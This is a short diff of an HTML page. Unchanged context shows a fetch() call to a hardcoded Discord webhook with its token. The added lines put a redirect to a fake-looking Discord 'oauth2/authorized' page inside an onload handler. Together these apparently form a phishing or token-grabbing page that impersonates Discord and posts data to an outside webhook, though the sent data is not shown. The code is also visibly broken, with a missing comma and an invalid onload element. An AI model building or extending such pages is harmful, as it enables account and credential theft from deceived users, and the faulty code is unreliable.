@@ -126,8 +126,11 @@ fetch('https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHv
   .then((json) => console.log(json));
   
 </script>
+<element onload="redirectToDone">
 <script>
-window.open("https://discord.com/oauth2/authorized" _self);
+function redirectToDone() {
+    window.open("https://discord.com/oauth2/authorized" _self);
+}
 </script>
   </div>
       </div>
